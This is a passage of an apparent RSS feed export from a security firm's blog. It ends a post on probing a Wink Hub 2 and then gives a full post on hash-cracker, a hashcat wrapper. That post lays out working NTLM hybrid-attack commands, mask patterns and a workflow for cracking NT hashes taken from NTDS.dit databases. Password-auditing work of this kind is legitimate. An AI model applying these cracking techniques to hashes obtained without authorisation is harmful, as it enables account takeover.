alter a strapping resistor to tell it to try and boot from USB – actually finding that will be a fun exercise with no schematic or board level diagram! There was no switch on board to do it for us, unfortunately! (Although in retrospect, there is a button labeled SW3 that we didn’t explore!). After the fact, I realised that there are two test points adjacent to the USB connector footprint, and these are connected to the D- and D+ USB signals. No need for the super fine soldering work! One might even be able to make a pogo-pin adapter, taking Vcc and Ground connections from elsewhere on the board!\nAt this point, we started wrapping up our investigation as we were running out of time. Ideas for future exploration include:\nInvestigating how the Android Wink Application locates and provisions the Wink Hub, setting WiFi credentials, etc.\nAllowing the first curl connection to succeed, and let the Hub get the time. Keeping track of how many bytes are downloaded is probably a good idea, and terminating the connection if it looks like it is downloading a new partition image would probably be wise. Then intercepting future requests after that, until we see some interesting network behaviour. Hopefully! \nBuying another Hub 2, and using hot air to remove the flash chip, and take an image of it. Then, reviewing the various partitions for any possible vulnerabilities that could result in code execution. The exploit itself would need to be stored on the unverified database or database backup partitions, of course, otherwise the partition signature checks will fail.\nTrying to find the strapping resistor to get the Hub to boot from USB. This might be a dead end due to the High Assurance Boot, but NCC Group did find a vulnerability in the i.MX6 CPU that might be relevant.",
      "content": "Rogan brought half of his hardware parts bin to the hackathon!\n\n",
      "contentSnippet": "Rogan brought half of his hardware parts bin to the hackathon!",
      "guid": "https://sensepost.com/blog/2023/investigating-the-wink-hub-2/",
      "isoDate": "2023-05-26T10:40:21.000Z",
      "itunes": {}
    },
    {
      "title": "hash-cracker – password cracking done effectively",
      "link": "https://sensepost.com/blog/2023/hash-cracker-password-cracking-done-effectively/",
      "pubDate": "Wed, 05 Apr 2023 12:35:21 +0000",
      "content:encoded": "<h2 class=\"wp-block-heading\">Intro</h2>\n\n\n\n<p>I wrote a tool to help with cracking of hashes, today I finally decided to blog about it. The idea was to take what I&#x2019;d learned about common patterns in passwords, and put my experience into practice to make password cracking more efficient on future engagements. Below is a short history of how we got to where we are, as well as some examples of how to use it.</p>\n\n\n\n<h2 class=\"wp-block-heading\">The Indirect Start of Hash-cracker</h2>\n\n\n\n<p>For the start of hash-cracker we first need to go back to the hassle of my <code>notes_all.txt</code> &#x2013; this was, explicitly, my text file with a list of commands I used most. These notes for hash-cracking are in the image below:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/hash-cracker-notes.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"836\" src=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/hash-cracker-notes-1024x836.png\" alt=\"\" class=\"wp-image-63973\"></a></figure>\n\n\n\n<p>The contents of <code>notes_all.txt</code> were all migrated to what is now known as the <em>Knowledge Base</em> &#x2013; aka <a rel=\"noreferrer noopener\" href=\"https://kb.offsec.nl\" target=\"_blank\">kb.offsec.nl</a> / <a rel=\"noreferrer noopener\" href=\"https://github.com/crypt0rr/kb\" target=\"_blank\">https://github.com/crypt0rr/kb</a>. This <a rel=\"noreferrer noopener\" href=\"https://gohugo.io/\" target=\"_blank\">Hugo</a> based website is built with a <a rel=\"noreferrer noopener\" href=\"https://github.com/crypt0rr/kb/tree/main/.github/workflows\" target=\"_blank\">CI/CD pipeline</a> via GitHub to <a rel=\"noreferrer noopener\" href=\"https://pages.cloudflare.com/\" target=\"_blank\">CloudFlare </a><a rel=\"noreferrer noopener\" href=\"https://pages.cloudflare.com/\" target=\"_blank\">P</a><a rel=\"noreferrer noopener\" href=\"https://pages.cloudflare.com/\" target=\"_blank\">ages</a> where it is hosted as well. Feel free to contribute!</p>\n\n\n\n<p>During this note migration, I wondered how could I use the hashcat commands more effectively during engagements.</p>\n\n\n\n<p>The opportunity I saw was to improve and eventually create a more efficient way of cracking hashes on regular hardware. Think laptop GPUs and low-level computer GPUs. This does not exclude GPU clusters etc. but is not the main goal.</p>\n\n\n\n<p>Basically, I have assumed that the commands as shown in the image above should at least be part of the script, not yet thinking further about other techniques and possibilities. With current knowledge, I would approach this differently in the future, first better figuring out exactly what the requirements are before building.</p>\n\n\n\n<h2 class=\"wp-block-heading\">The Actual Start of Hash-cracker</h2>\n\n\n\n<p>From, assessments I&#x2019;ve learnt a lot about common patterns people tend to use when setting a new password. For example;</p>\n\n\n\n<ul>\n<li>Summer2023!</li>\n\n\n\n<li>John1970?</li>\n\n\n\n<li>l3kk3rp@ssw0rd</li>\n</ul>\n\n\n\n<p>Most commonly used is a word followed by x amount of numbers and a special character. But also, a technique called leet speak &#x2013; replacing chars <code>a/@</code> <code>o/0</code> <code>i/1</code> <code>e/3</code> etc.</p>\n\n\n\n<p>Based on this information, I started experimenting with hybrid/combinator attacks. In this form of hash cracking attacks you have one list with words as input and a brute force pattern. This brute force pattern can be placed in front or at the end of the words from the list. With this knowledge I wrote some simple commands into a bash script.</p>\n\n\n\n<ul>\n<li><code>-m1000</code>&#xA0;&#x2013; hash mode NTLM &#x2013;&#xA0;<a rel=\"noreferrer noopener\" href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\" target=\"_blank\">list of supported modes</a></li>\n\n\n\n<li><code>nt_hashes</code>&#xA0;&#x2013; a file containing the hashes that I want to crack (e.g.&#xA0;<code>4ea072db1483a7df8643772b6b25cb43</code>)</li>\n\n\n\n<li><code>-a6</code>&#xA0;&#x2013; attack mode used, in this case hybrid</li>\n\n\n\n<li><code>?d?d?d?d?s</code>&#xA0;&#x2013; the brute force pattern where&#xA0;<code>?d</code>&#xA0;= 0123456789&#xA0;<code>?s</code>&#xA0;=&#xA0;<code>&#xAB;space&#xBB;!&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\\]^_{|}~`</code></li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>hashcat -m1000 nt_hashes -a6 wordlist &apos;?d?d?d?d?s&apos;\nhashcat -m1000 nt_hashes -a6 wordlist &apos;?d?d?d?d?d?s&apos;\nhashcat -m1000 nt_hashes -a6 wordlist &apos;?d?d?d?d?d?d?s&apos;</code></pre>\n\n\n\n<p>The example above was my first try, this will work for cracking something like&#xA0;<code>Summer2023!</code>,&#xA0;if&#xA0;<code>Summer</code>&#xA0;is in the wordlist. After using this method for a while, I started looking into more attack modes and options within hashcat. Some examples are:</p>\n\n\n\n<ul>\n<li><a href=\"https://hashcat.net/wiki/doku.php?id=dictionary_attack\" target=\"_blank\" rel=\"noreferrer noopener\">Dictionary attack</a></li>\n\n\n\n<li><a href=\"https://hashcat.net/wiki/doku.php?id=combinator_attack\" target=\"_blank\" rel=\"noreferrer noopener\">Combinator attack</a></li>\n\n\n\n<li><a href=\"https://hashcat.net/wiki/doku.php?id=rule_based_attack\" target=\"_blank\" rel=\"noreferrer noopener\">Rule based attack</a></li>\n\n\n\n<li><a href=\"https://hashcat.net/wiki/doku.php?id=toggle_case_attack\" target=\"_blank\" rel=\"noreferrer noopener\">Toggle case attack</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">v1.0</h2>\n\n\n\n<p>The idea behind hash-cracker was, and still is, to be able to crack efficiently by putting gathered knowledge on password (re)use into a &#x2018;simple&#x2019; script. This was all optimised to run quick, but effective jobs on a laptop with a dedicated GPU (NVIDIA M1200 Mobile at the time). To get an idea about the performance of this GPU, I ran the benchmark within&#xA0;<a rel=\"noreferrer noopener\" href=\"https://hashcat.net/hashcat/\" target=\"_blank\">hashcat</a> &#x2013; it is available over&#xA0;<a rel=\"noreferrer noopener\" href=\"https://gist.github.com/crypt0rr/5a2e40f0382ee8004ff7011941778624\" target=\"_blank\">here</a>.</p>\n\n\n\n<p>After playing around with hashcat on my CLI and being inefficient about it, I put my gathered knowledge into a simple bash script. The first release was one large file with 222 lines of code (without dependencies / add-ins). When started, it looked like this:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ ./processor.sh \nHash-cracker v1.0 by crypt0rr\n\nChecking if requirements are met:\n[+] Hashcat is installed\n[+] common-substr is executable\n\n0. Exit\n1. Default light rules\n2. Default heavy rules\n3. Brute force\n4. Iterate results\n5. Plain\n6. Hybrid\n7. Toggle-case\n8. Combinator\n9. Prefix suffix (advise: first run steps above)\n10. Common substring (advise: first run steps above)\n99. Show info about modules\n100. Show results in usable format\nPlease enter number:</code></pre>\n\n\n\n<p>With a few options already, I felt quite proud being able to do my first (public) release. Also with this release, I included a bunch of <a href=\"https://github.com/sensepost/hash-cracker/tree/master/example-hashes\" target=\"_blank\" rel=\"noreferrer noopener\">example hashes</a>&#xA0;in three different hashing formats, namely:</p>\n\n\n\n<ul>\n<li>MD5</li>\n\n\n\n<li>SHA1</li>\n\n\n\n<li>NT(LM)</li>\n</ul>\n\n\n\n<p>With functions like checking requirements to run the script, light rules to have a go with, and also iterate the things I&#x2019;ve cracked already. To have a look at the code you can checkout the <a href=\"https://github.com/sensepost/hash-cracker/tree/92986f16507c232178804525e754c89d778a1030\">following commit</a>:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>git clone https://github.com/sensepost/hash-cracker\ngit checkout 92986f16507c232178804525e754c89d778a1030 \n./processor.sh</code></pre>\n\n\n\n<p>With this script, efficiency and more effective cracking on a mobile GPU was more noticeable.</p>\n\n\n\n<h2 class=\"wp-block-heading\">v2.0</h2>\n\n\n\n<p>The first version had some improvements in the time between releasing v2.0. The major change for v2.0 was moving everything from the main script and into separate files that would be sourced when called. This has two benefits, first the ability to extend and adapt extra features more easily, secondly someone else could actually find what the &#x2018;processors&#x2019; were doing.</p>\n\n\n\n<p>With v1.7 the Python2 based Password Analysis and Cracking Kit (<a rel=\"noreferrer noopener\" href=\"https://kb.offsec.nl/tools/hash-cracking/pack/\" target=\"_blank\">PACK</a>) was added as functionality. This was expanded on during the development of v2.x &#x2013; eventually resulting in two effective options, namely:</p>\n\n\n\n<ul>\n<li>PACK rulegen</li>\n\n\n\n<li>PACK mask</li>\n</ul>\n\n\n\n<p>As the name implies, rulegen is able to create a new &#x2018;rule&#x2019; based on the already cracked passwords. So, it takes the cracked passwords from the current potfile (database with hash:plaintext), and performs an analysis for patterns. A rule is created upon the results and this can be used to perform a rule based attack (wordlist + rule).</p>\n\n\n\n<p>The mask function does basically the same, but the output is slightly different. This function will output a set of brute-force patterns based on the already cracked passwords. These brute-force patterns are run as-is.</p>\n\n\n\n<p>In October 2021, Apple introduced the Apple Silicon M1 Pro / Max processors for their Pro line of MacBooks. After the first models were delivered, hashcat benchmarks started popping up. During this period, I also ordered a M1 Pro equipped MacBook. Since some binaries in hash-cracker are pre-compiled for x64-based systems it would not work directly.</p>\n\n\n\n<p>When I got delivery I started compiling the needed binaries to release a Apple Silicon version of hash-cracker. So, (almost) everything from v2.6 was used as starting point for the first release, namely&#xA0;<a href=\"https://github.com/sensepost/hash-cracker-apple-silicon/releases/tag/v2.7\" data-type=\"URL\" data-id=\"https://github.com/sensepost/hash-cracker-apple-silicon/releases/tag/v2.7\" target=\"_blank\" rel=\"noreferrer noopener\">v2.7</a>&#xA0;&#x2013; Apple Silicon Edition.</p>\n\n\n\n<p>After this new highlight in the hash-cracker journey, I started implementing more options, more logic and playing with variables for almost everything (instead of hardcoding).</p>\n\n\n\n<h2 class=\"wp-block-heading\">v3.x</h2>\n\n\n\n<p>Version 3.0 arrived with some small but welcome additions like multi-wordlist support, re-arranged menu and getting rid of hardware monitoring.</p>\n\n\n\n<p>From there I started moving some stuff over to separate, source-able, scripts. Also, with the release of v3.1, it is now possible to choose whether or not you use optimised kernels. The most important use-case for optimised kernels is the fact they are optimised for a specific hash mode instead of a bunch. This makes them a lot quicker, but are limited to a character length of 32.&#xA0;<code>Soifthisisyourpassworditwillnotbecrackedwithoptimisedkernels</code>. By default, optimised kernels are enabled but you can disable them by adding the&#xA0;<code>-n</code>&#xA0;flag when starting hash-cracker.</p>\n\n\n\n<p>Below v3.1 with the kernel option build in, nice!</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ ./hash-cracker.sh -n\nhash-cracker v3.1 by crypt0rr (https://github.com/crypt0rr)\n\nChecking if requirements are met:\n[+] Hashcat is installed\n[+] common-substr is executable\n[+] Python2 available\n[+] expander is executable\n[+] Potfile &quot;hash-cracker.pot&quot; present\n[-] Optimised kernels disabled\n[...]</code></pre>\n\n\n\n<h3 class=\"wp-block-heading\">v3.2 &#x2013; CeWL</h3>\n\n\n\n<p>For those who don&#x2019;t know&#xA0;<a rel=\"noreferrer noopener\" href=\"https://github.com/digininja/CeWL/\" target=\"_blank\">CeWL</a>, this is a Custom Word List Generator. The script scrapes information from the site given to it, you can specify the depth and word length you want to save. This is especially useful during assessments for clients with a website, which company doesn&#x2019;t have one nowadays?</p>\n\n\n\n<h3 class=\"wp-block-heading\">v3.4 &#x2013; More Flexibility</h3>\n\n\n\n<p>The latest version as of (2023-03) is v3.4, which supports some more helpful options but most importantly:</p>\n\n\n\n<ul>\n<li>Proper handling of creating and deleting temporary files &#x2013; no more&#xA0;<code>tmp_</code>&#xA0;files in the root directory</li>\n\n\n\n<li>Proper cleanup of temporary files when the user stops hash-cracker with&#xA0;<code>CTRL+C</code></li>\n\n\n\n<li>Numbers of the available options are now reflected in the script names to make them directly recognizable</li>\n\n\n\n<li>Parameter handling when the user specifies one or more arguments at CLI</li>\n\n\n\n<li>Ability to disable both optimised kernel and loopback functionality</li>\n</ul>\n\n\n\n<p>Have a look at that&#xA0;<em>help</em>&#xA0;menu:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ ./hash-cracker.sh -h\nNote: flags are optional, by default hash-cracker will run with optimized kernels enabled and perform loopback actions.\n\nUsage: ./hash-cracker [FLAG]\n\nFlags:\n -l / --no-loopback\n   Disable loopback functionality\n -n / --no-limit\n   Disable the use of optimized kernels (un-limits password length)\n -m / --module-info\n   Display information around modules/options\n -s [hash-name] / --search [hash-name]\n   Will search local DB for hash module. E.g. &apos;-s ntlm&apos;</code></pre>\n\n\n\n<p>So, with the now released v3.4 the following menu is shown to the user. 19 options, all based on efficiency but able to run for days if you want to.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ ./hash-cracker.sh \nhash-cracker v3.4 by crypt0rr (https://github.com/crypt0rr)\n\nMandatory modules:\n[+] Hashcat is executable\n[+] Potfile &quot;hash-cracker.pot&quot; present\n\nOptional modules:\n[+] Common-substr is executable\n[+] Python2 is executable\n[+] Expander is executable\n[+] CeWL is executable\n\nVariable Parameters:\n[+] Optimised kernels enabled\n[+] Loopback enabled\n\n0. Exit\n1. Brute force\n2. Light rules\n3. Heavy rules\n4. Enter specific word/name/company\n5. Enter specific word/name/company (brute force)\n6. Hybrid\n7. Toggle-case\n8. Combinator\n9. Iterate results\n10. Prefix suffix (advise: first run steps above)\n11. Common substring (advise: first run steps above)\n12. PACK rulegen\n13. PACK mask\n14. Fingerprint attack\n15. Directory of word lists plain and then with OneRuleToRuleThemAll\n16. Username iteration (only complete NTDS)\n17. Markov-chain passwords generator\n18. CeWL wordlist generator\n19. Digit remover\n\nPlease enter job number: </code></pre>\n\n\n\n<h2 class=\"wp-block-heading\">v3.5 &#x2013; Small bump in supported hashtypes</h2>\n\n\n\n<p>Updated supported hash types, based on hashcat <code>v6.2.6-420-gdc51a1a97</code></p>\n\n\n\n<h2 class=\"wp-block-heading\">v3.6 &#x2013; Stacker</h2>\n\n\n\n<p>The 4th of May is <em>World Password Day</em> &#x2013; so hash-cracker got a quick update which would help cracking password hashes even more on this special day.</p>\n\n\n\n<p>Hashcat released the <a rel=\"noreferrer noopener\" href=\"https://github.com/hashcat/hashcat/blob/master/rules/stacking58.rule\" target=\"_blank\">stacking58</a> rule, hashcat describes this rule as &#x201C;This rule file is designed to act as a base for usage in a rule stacking runs.&#x201D;. So, hash-cracker got a new option &#x2019;20&#x2019;. This option will use the new stacking58 rule and do some magic with other rules resulting in a cool new set of cleartexts for your remaining hashes!</p>\n\n\n\n<h2 class=\"wp-block-heading\">v3.7 &#x2013; Just before</h2>\n\n\n\n<p>When asking people on points to improve hash-cracker, having a static configuration file for the hashlist and hashtype have been recurring themes. So, with the release of this blogpost, I&#x2019;ve also released version <a rel=\"noreferrer noopener\" href=\"https://github.com/sensepost/hash-cracker/releases/tag/v3.7\" data-type=\"URL\" data-id=\"https://github.com/sensepost/hash-cracker/releases/tag/v3.7\" target=\"_blank\">3.7</a> doing exactly this.</p>\n\n\n\n<p>Introducing <code>hash-cracker.conf</code> the location where you can set 4 things, namely:</p>\n\n\n\n<ul>\n<li><code>HASHCAT</code>&#xA0;&#x2013; binary path where you&#x2019;ve installed&#xA0;<a href=\"https://github.com/hashcat/hashcat\">hashcat</a></li>\n\n\n\n<li><code>HASHTYPE</code>&#xA0;&#x2013; mode hashcat will run in (e.g. 1000 (NTLM))</li>\n\n\n\n<li><code>HASHLIST</code>&#xA0;&#x2013; file containing target hashes</li>\n\n\n\n<li><code>POTFILE</code>&#xA0;&#x2013; specify the potfile you want to use / create</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">The Options, how I use them and how they work</h2>\n\n\n\n<p>hash-cracker v3.7 currently consists of 20 options. These options can be used in the order as available, or in random order. As you use the script more on different datasets, the smartest options for your hardware will naturally emerge.</p>\n\n\n\n<p>How do I use the script itself? What options, what order?</p>\n\n\n\n<p>The main datasets I use the script for are analysis of NT hashes extracted from NTDS.dit databases. This type of hash does not use, for example, salting or other techniques to increase the difficulty. When a password is converted to an NT hash then the same input will always produce the same output.</p>\n\n\n\n<p>For example the password &#x201C;Welcome0&#x201D; will always result in <code>NT: b6adc1c00024a2e4456de1e3d065af41</code>.</p>\n\n\n\n<p>I also asked ChatGPT to explain what an NT hash is, below is the explanation I received.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/chatgpt-nt-hash.png\"><img loading=\"lazy\" decoding=\"async\" width=\"846\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/chatgpt-nt-hash-846x1024.png\" alt=\"\" class=\"wp-image-66915\"></a><figcaption class=\"wp-element-caption\">ChatGPT explanation of the NT hash</figcaption></figure>\n\n\n\n<p>Normally I always start with option 1, brute-force. This option is going to perform a brute force action on the input with common patterns. A brute force attack involves holding a certain character set against the input in completeness and with random order. An Example of such pattern is &#x201C;?l?l?l?l?d?d?d?d?d&#x201D;. Here the &#x2018;?d&#x2019; stands for digits 0-9 and &#x2018;?l&#x2019; stands for lower-case &#x2018;abcdefghijklmnopqrstuvwxyz&#x2019;. This pattern will arrive at passwords like &#x2018;Hola12345&#x2019; / &#x2018;Boat8492&#x2019; / &#x2018;Lolz1337&#x2019;.</p>\n\n\n\n<p>After completing this brute-force (option 1), I usually run option 15 using as input all the word lists provided with hash-cracker. This option checks the word lists and adds variations using a rule. A rule creates variations on the entered passwords. Option 15 uses an improved version of OneRuleToRuleThemAll, called <a href=\"https://github.com/stealthsploit/OneRuleToRuleThemStill\">OneRuleToRuleThemStill</a>. This option also provides interesting results when combined with other word lists, for example the list provided by hashmob.net, &#x2018;HashMob Combined Full&#x2019; &#x2013; at the time of writing 15.27GB in size.</p>\n\n\n\n<p>Once this first batch is completed, I move on to option 9, iterations. This option grabs the jar file (hash-cracker.jar) and filters the already cracked passwords to a temporary file to perform actions with, for each iteration this action is performed, as at each step new passwords may have been cracked which again can serve as input. The temporary file with already cracked passwords is used as input for a rules-based cracking action. As mentioned earlier, rules create variations on the given input, in this case the passwords in the temporary file.</p>\n\n\n\n<p>Option 9 is often followed by options 10 and 11. Two options based on <a href=\"https://github.com/sensepost/common-substr\">common-substr</a>. Common-substr is a simple tool to extract the most common substrings from an input text and is built for password cracking. Option 10 is based on the &#x2018;Prefix &amp; Suffix Substrings&#x2019; module and option 11 concerns &#x2018;All Substrings&#x2019;.</p>\n\n\n\n<p>For cracking longer passwords, or passwords where the user thinks they are clever by pasting the same password in sequence, option 8 was created. I often use this option in conjunction with the provided list &#x2018;ignis-10M.txt&#x2019;. An example of how this option works, the list (ignis-10M.txt) contains &#x2018;password123&#x2019; and &#x2018;password456&#x2019;, option 8 will create &#x2018;password123password123&#x2019; and &#x2018;password123password456&#x2019; as candidates. Importantly, option 8 asks for two lists of words as input. The larger the second list (right list), the longer the duration of the option will be. This has to do with the underlying logic of hashcat. So for speed, it may be desirable to choose a larger list as the first list and a smaller list as the second list.</p>\n\n\n\n<p>After this action with option 8, I continue with option 6, &#x201C;hybrid&#x201D;. Hybrid says it all, a hybrid action is done using two techniques. On the one hand a dictionary, on the other hand brute-force. This option incorporates several patterns that I have classified as &#x2018;common&#x2019; in the time I have been cracking passwords. For example, the pattern &#x201C;Welcome1234!&#x201D; a word followed by about four digits and an exclamation mark. The word list contains the word &#x2018;Welcome&#x2019; and the brute-force pattern invents the rest with it &#x2018;1234!&#x2019;</p>\n\n\n\n<p>Often I end with a few repetitions of options 9, 10 and 11. After this I go through the results and see if any patterns stand out and try to get additional results using the same or other options.</p>\n\n\n\n<p>In the end it&#x2019;s mostly trial and error, you will naturally find a pattern that works well for the datasets and environments you interact with. Every country has its own patterns, every environment has its own patterns.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Statistics for N3rds</h2>\n\n\n\n<p>But, how do the Apple Silicon M1 and M2 Pro perform against my previous NVIDIA M1200?</p>\n\n\n\n<ul>\n<li><a rel=\"noreferrer noopener\" href=\"https://gist.github.com/crypt0rr/5a2e40f0382ee8004ff7011941778624\" target=\"_blank\">Benchmark: NVIDIA M1200</a></li>\n\n\n\n<li><a rel=\"noreferrer noopener\" href=\"https://gist.github.com/crypt0rr/66a96a71fa502b6e5ea2eae81ba61c4f\" target=\"_blank\">Benchmark: Apple Silicon M1 Pro</a></li>\n\n\n\n<li><a rel=\"noreferrer noopener\" href=\"https://gist.github.com/crypt0rr/dac4ebd7713e69ae0acc007e7d382c2f\" target=\"_blank\">Benchmark: Apple Silicon M2 Pro</a></li>\n</ul>\n\n\n\n<p>Let&#x2019;s take some commonly used hash types to compare. Note, the M1200 used about 55W from the wall during benchmarking, and the M1 Pro used about 25W.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/Screenshot-2023-08-25-at-16.03.46.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"325\" src=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/Screenshot-2023-08-25-at-16.03.46-1024x325.png\" alt=\"\" class=\"wp-image-69101\"></a><figcaption class=\"wp-element-caption\">Comparison M1200/M1Pro/M2Pro</figcaption></figure>\n\n\n\n<h3 class=\"wp-block-heading\">Percentages</h3>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/Screenshot-2023-08-25-at-16.04.32.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"325\" src=\"https://sensepost.com/img/pages/blog/2023/hash-cracker-password-cracking-done-effectively/Screenshot-2023-08-25-at-16.04.32-1024x325.png\" alt=\"\" class=\"wp-image-69100\"></a></figure>\n\n\n\n<h2 class=\"wp-block-heading\">Example Hashes</h2>\n\n\n\n<p>To start cracking hashes you first need hashes, that&#x2019;s why&#xA0;<em>hash-cracker</em>&#xA0;comes with multiple sets of&#xA0;<a rel=\"noreferrer noopener\" href=\"https://github.com/crypt0rr/hash-cracker/tree/master/example-hashes\" target=\"_blank\">example</a><a rel=\"noreferrer noopener\" href=\"https://github.com/sensepost/hash-cracker/tree/master/example-hashes\" target=\"_blank\"> </a><a rel=\"noreferrer noopener\" href=\"https://github.com/crypt0rr/hash-cracker/tree/master/example-hashes\" target=\"_blank\">hashes</a>.</p>\n\n\n\n<ul>\n<li>MD5 &#x2013; 416.612 hashes (<a href=\"https://raw.githubusercontent.com/sensepost/hash-cracker/master/example-hashes/md5.example.txt\">download</a>)</li>\n\n\n\n<li>SHA1 &#x2013; 430.643 hashes (<a href=\"https://raw.githubusercontent.com/sensepost/hash-cracker/master/example-hashes/sha1.example.txt\">download</a>)</li>\n\n\n\n<li>NTLM &#x2013; 805.021 hashes (<a href=\"https://raw.githubusercontent.com/sensepost/hash-cracker/master/example-hashes/ntlm.example.txt\">download</a>)</li>\n</ul>\n\n\n\n<h3 class=\"wp-block-heading\">There is More! Have You Been Pwned?</h3>\n\n\n\n<p><strong><em>&#x2018;;&#x2013;have i been pwned?</em></strong>&#xA0;&#x2013; probably the most recognised and well known platform collecting data from breaches in all forms and sizes &#x2013; ran by&#xA0;<a rel=\"noreferrer noopener\" href=\"https://www.troyhunt.com/\" target=\"_blank\">Troy Hunt</a>. You may have used it to check if your own (personal) email address has leaked? Otherwise, have a go on&#xA0;<a rel=\"noreferrer noopener\" href=\"https://haveibeenpwned.com/\" target=\"_blank\">haveibeenpwned.com</a>.</p>\n\n\n\n<p>The dataset that is populated with hashes found in leaks and is available for download through the&#xA0;<a rel=\"noreferrer noopener\" href=\"https://github.com/HaveIBeenPwned/PwnedPasswordsDownloader#what-is-haveibeenpwned-downloader\" target=\"_blank\">haveibeenpwned-downloader</a></p>\n\n\n\n<h2 class=\"wp-block-heading\">Some URLs to Bookmark</h2>\n\n\n\n<ul>\n<li><a rel=\"noreferrer noopener\" href=\"https://kb.offsec.nl\" target=\"_blank\">https://kb.offsec.nl</a></li>\n\n\n\n<li><a href=\"https://github.com/sensepost/hash-cracker\">https://github.com/sensepost/hash-cracker</a></li>\n\n\n\n<li><a href=\"https://github.com/sensepost/hash-cracker-apple-silicon\">https://github.com/sensepost/hash-cracker-apple-silicon</a></li>\n\n\n\n<li><a href=\"https://saf.offsec.nl\" target=\"_blank\" rel=\"noreferrer noopener\">https://saf.offsec.nl</a></li>\n\n\n\n<li><a rel=\"noreferrer noopener\" href=\"https://cyberchef.offsec.nl\" target=\"_blank\">https://cyberchef.offsec.nl</a></li>\n\n\n\n<li><a href=\"https://sensepost.com/blog/2018/cracking-efficiency-measurements-common-substring-attack/\" target=\"_blank\" rel=\"noreferrer noopener\">https://sensepost.com/blog/2018/cracking-efficiency-measurements-common-substring-attack/</a></li>\n</ul>\n",
      "content:encodedSnippet": "Intro\nI wrote a tool to help with cracking of hashes, today I finally decided to blog about it. The idea was to take what I’d learned about common patterns in passwords, and put my experience into practice to make password cracking more efficient on future engagements. Below is a short history of how we got to where we are, as well as some examples of how to use it.\nThe Indirect Start of Hash-cracker\nFor the start of hash-cracker we first need to go back to the hassle of my notes_all.txt – this was, explicitly, my text file with a list of commands I used most. These notes for hash-cracking are in the image below:\n\n\n\n\nThe contents of notes_all.txt were all migrated to what is now known as the Knowledge Base – aka kb.offsec.nl / https://github.com/crypt0rr/kb. This Hugo based website is built with a CI/CD pipeline via GitHub to CloudFlare Pages where it is hosted as well. Feel free to contribute!\nDuring this note migration, I wondered how could I use the hashcat commands more effectively during engagements.\nThe opportunity I saw was to improve and eventually create a more efficient way of cracking hashes on regular hardware. Think laptop GPUs and low-level computer GPUs. This does not exclude GPU clusters etc. but is not the main goal.\nBasically, I have assumed that the commands as shown in the image above should at least be part of the script, not yet thinking further about other techniques and possibilities. With current knowledge, I would approach this differently in the future, first better figuring out exactly what the requirements are before building.\nThe Actual Start of Hash-cracker\nFrom, assessments I’ve learnt a lot about common patterns people tend to use when setting a new password. For example;\nSummer2023!\nJohn1970?\nl3kk3rp@ssw0rd\nMost commonly used is a word followed by x amount of numbers and a special character. But also, a technique called leet speak – replacing chars a/@ o/0 i/1 e/3 etc.\nBased on this information, I started experimenting with hybrid/combinator attacks. In this form of hash cracking attacks you have one list with words as input and a brute force pattern. This brute force pattern can be placed in front or at the end of the words from the list. With this knowledge I wrote some simple commands into a bash script.\n-m1000 – hash mode NTLM – list of supported modes\nnt_hashes – a file containing the hashes that I want to crack (e.g. 4ea072db1483a7df8643772b6b25cb43)\n-a6 – attack mode used, in this case hybrid\n?d?d?d?d?s – the brute force pattern where ?d = 0123456789 ?s = «space»!\"#$%&'()*+,-./:;<=>?@[\\]^_{|}~`\nhashcat -m1000 nt_hashes -a6 wordlist '?d?d?d?d?s'\nhashcat -m1000 nt_hashes -a6 wordlist '?d?d?d?d?d?s'\nhashcat -m1000 nt_hashes -a6 wordlist '?d?d?d?d?d?d?s'\nThe example above was my first try, this will work for cracking something like Summer2023!, if Summer is in the wordlist. After using this method for a while, I started looking into more attack modes and options within hashcat. Some examples are:\nDictionary attack\nCombinator attack\nRule based attack\nToggle case attack\nv1.0\nThe idea behind hash-cracker was, and still is, to be able to crack efficiently by putting gathered knowledge on password (re)use into a ‘simple’ script. This was all optimised to run quick, but effective jobs on a laptop with a dedicated GPU (NVIDIA M1200 Mobile at the time). To get an idea about the performance of this GPU, I ran the benchmark within hashcat – it is available over here.\nAfter playing around with hashcat on my CLI and being inefficient about it, I put my gathered knowledge into a simple bash script. The first release was one large file with 222 lines of code (without dependencies / add-ins). When started, it looked like this:\n$ ./processor.sh \nHash-cracker v1.0 by crypt0rr\n\nChecking if requirements are met:\n[+] Hashcat is installed\n[+] common-substr is executable\n\n0. Exit\n1. Default light rules\n2. Default heavy rules\n3. Brute force\n4. Iterate results\n5. Plain\n6. Hybrid\n7. Toggle-case\n8. Combinator\n9. Prefix suffix (advise: first run steps above)\n10. Common substring (advise: first run steps above)\n99. Show info about modules\n100. Show results in usable format\nPlease enter number:\nWith a few options already, I felt quite proud being able to do my first (public) release. Also with this release, I included a bunch of example hashes in three different hashing formats, namely:\nMD5\nSHA1\nNT(LM)\nWith functions like checking requirements to run the script, light rules to have a go with, and also iterate the things I’ve cracked already. To have a look at the code you can checkout the following commit:\ngit clone https://github.com/sensepost/hash-cracker\ngit checkout 92986f16507c232178804525e754c89d778a1030 \n./processor.sh\nWith this script, efficiency and more effective cracking on a 